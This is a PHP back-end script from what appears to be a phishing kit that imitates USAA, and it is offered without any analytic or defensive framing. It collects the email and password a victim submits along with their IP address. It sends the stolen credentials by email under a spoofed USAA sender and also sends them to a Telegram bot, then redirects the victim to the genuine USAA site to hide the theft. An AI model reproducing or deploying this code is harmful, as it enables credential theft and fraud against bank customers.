<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "📧USAA | Mail Access📧\n";
$message .= "Email: ".$_POST['email']."\n";;
$message .= "Password: ".$_POST['pass']."\n";;
$message .= "Ip: $ip\n";
$message .= "📧USAA | Mail Access📧\n";
$subject = "USAA Mail Access | $ip ";
$headers = "From:USAA <itna1337@network.pickup.fr>";
mail($send,$subject,$message,$headers);
fwrite($text, $message);


file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location: https://www.usaa.com/inet/wc/why_choose_usaa_main?akredirect=true");

include "Telegram.php";

?>